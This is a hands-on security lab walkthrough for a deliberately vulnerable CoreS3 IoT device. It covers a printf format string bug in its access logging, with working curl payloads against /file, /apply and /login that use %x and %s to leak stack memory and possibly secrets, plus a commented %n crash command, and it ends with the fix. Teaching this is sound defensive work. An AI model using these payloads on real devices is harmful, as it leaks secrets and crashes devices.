# L12: Format String Vulnerability

## Goal
Exploit a printf format string vulnerability in the web server's access logging to leak stack memory contents via the device's serial output (UART).

## Background

**Why this matters**: Format string vulnerabilities occur when user input is passed directly as the format argument to printf-family functions. Instead of treating input as data, printf interprets specifiers like `%x`, `%s`, and `%n` as instructions to read from (or write to) memory.

**What you're looking for in IoT devices:**
- Direct use of `printf(user_input)` instead of `printf("%s", user_input)`
- Log functions that pass user-controlled strings as the format argument
- Debug output that includes HTTP parameters, MQTT messages, or serial input unsanitized

**On CoreS3**: The `logAccess()` function constructs a log line from the endpoint path and query parameters, then passes it directly to `DualSerial.printf(logLine.c_str())`. The leaked values appear on both USB serial and the debug UART (GPIO43/TXD0).

Vulnerable code path:
```
HTTP request -> handler -> logAccess(endpoint, params)
  -> DualSerial.printf(logLine.c_str())   // params used as format string!
```

Three endpoints call `logAccess()` with user-controlled parameters:
- `GET /file?name=...`
- `POST /apply` (ssid parameter)
- `POST /login` (username parameter)

## Hardware Setup

- CoreS3 device connected via USB (serial at `/dev/ttyACM0`)
- WiFi connection to the device AP (`CoreS3-CAM-XXXX` at `192.168.4.1`)
- Two terminal windows: one for serial monitoring, one for HTTP requests

## Lab Walkthrough

### Step 1: Open a Serial Monitor

The format string vulnerability leaks stack memory through serial output, not the HTTP response. You must watch serial to see the leaked data.

```bash
# Terminal 1: Open serial monitor
pio device monitor -b 115200

# You should see: cores3-cam>
```

### Step 2: Send a Normal Request (Baseline)

Observe normal logAccess() output to recognize when format specifiers are being interpreted.

```bash
# Terminal 2: Send a normal request
curl 'http://192.168.4.1/file?name=test.txt'

# Expected serial output (Terminal 1):
# [ACCESS] /file name=test.txt
#
# No % characters in input, so printf treats it as a literal string.
```

### Step 3: Leak Stack Memory with %x

Each `%x` in the format string reads the next 4-byte value from the stack as hexadecimal. Since logAccess() pushed no corresponding arguments, printf reads whatever is on the stack.

In URLs, `%` must be encoded as `%25`, so `%x` becomes `%25x`.

```bash
curl 'http://192.168.4.1/file?name=%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x'

# Expected serial output (Terminal 1):
# [ACCESS] /file name=3ffc1a2c.0.3fca0034.a.40123456.3ffc1b00.3fca8000.42012345
#
# Address ranges:
#   0x3FFCxxxx - SRAM (stack/heap data)
#   0x4012xxxx - Flash/code (return addresses, function pointers)
#   0x3FCAxxxx - PSRAM
#   Small values - local variables, counters
```

### Step 4: Read Deeper into the Stack

Walk further down the stack to map its layout and find interesting values like return addresses and pointers.

```bash
# 16 stack positions
curl 'http://192.168.4.1/file?name=%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x_%25x'

# Record the values - they reveal:
# 1. Stack layout and depth
# 2. Return addresses (code layout)
# 3. Pointers to heap objects (potential targets for %s)
```

### Step 5: Attempt String Dereferencing with %s

If a value on the stack is a pointer to a string, `%s` prints its contents - potentially leaking PINs, passwords, or JWT secrets. If the value is not a valid pointer, the device crashes.

```bash
# Use %x to skip positions, then %s to dereference:
curl 'http://192.168.4.1/file?name=%25x%25x%25x%25x%25s'

# If pointer is valid: prints the string from memory
# If invalid: device crashes (power cycle and try a different position)
```

### Step 6: Use the /apply Endpoint

The `/apply` endpoint passes the SSID parameter to logAccess(). Different endpoints may process input differently before it reaches the vulnerable printf.

```bash
curl -X POST http://192.168.4.1/apply \
  -d 'ssid=%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x&pass=test'

# Expected serial output:
# [ACCESS] /apply ssid=3ffc1a2c.0.3fca0034.a.40123456.3ffc1b00.3fca8000.42012345&pass_len=4
```

### Step 7: Use the /login Endpoint

The `/login` endpoint passes the username parameter to logAccess(), demonstrating the vulnerability across multiple endpoints.

```bash
curl -X POST http://192.168.4.1/login \
  -d 'username=%25x.%25x.%25x.%25x&password=test'

# Expected serial output:
# [ACCESS] /login username=3ffc1a2c.0.3fca0034.a
```

### Step 8: Understand the %n Write Primitive (Theory)

The `%n` specifier writes the number of bytes printed so far to the address on the stack, converting a read vulnerability into a write primitive. On ESP32-S3, practical exploitation is limited due to Harvard architecture (separate instruction/data buses) and no traditional GOT/PLT, but `%n` can still corrupt data structures or cause denial of service.

```bash
# WARNING: %n writes to memory and WILL crash the device
# curl 'http://192.168.4.1/file?name=%25n'
```

## Impact

- **Information disclosure**: Arbitrary stack memory readable via serial - return addresses, local variables, heap pointers
- **Stack layout revelation**: Leaked code addresses reveal firmware memory map
- **Cross-endpoint attack surface**: `/file`, `/apply`, and `/login` all vulnerable through logAccess()
- **No authentication required**: `/file` is open to any device on the network
- **Dual output channels**: Leaked data on both USB serial and debug UART (GPIO43)
- **Potential write primitive**: `%n` enables memory writes (limited practical use on ESP32-S3)
- **Real-world parallel**: CVE-2020-10887 (TP-Link router printf format string)

## Remediation

```cpp
// VULNERABLE:
DualSerial.printf(logLine.c_str());

// FIXED:
DualSerial.printf("%s", logLine.c_str());
```

Or use `DualSerial.print()` which does not interpret format specifiers.

## References

- [CWE-134: Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)
- [OWASP Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [printf Format String Exploitation](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [GCC -Wformat-security Warning](https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html)
- [ESP32-S3 Technical Reference Manual - Memory Map](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
